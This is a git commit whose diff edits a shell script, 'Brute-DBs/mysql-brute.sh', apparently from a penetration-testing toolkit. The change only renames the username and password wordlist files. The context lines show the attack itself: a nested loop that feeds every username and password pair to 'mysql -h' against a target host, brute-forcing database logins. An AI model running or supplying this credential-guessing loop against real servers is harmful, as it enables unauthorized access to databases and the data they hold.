649e53b9dc2f1b814c7d34a2955d7263efddcfc4
Rafael Baldasso <77108325+rafaelbaldasso@users.noreply.github.com>
2024-02-21 18:23:08 -0300

    Update mysql-brute.sh

--- Brute-DBs/mysql-brute.sh
+++ Brute-DBs/mysql-brute.sh
@@ -4,8 +4,8 @@ if [ "$1" == "" ]
         then
                 echo;echo "[>] Usage: $0 <target>";echo
         else
-                for u in $(cat wordlists/mysql-users.txt);do
-                        for p in $(cat wordlists/mysql-pass.txt);do
+                for u in $(cat users.txt);do
+                        for p in $(cat pass.txt);do
                                 echo $u:$p
                                 mysql -h $1 --user=$u --password=$p
                         done
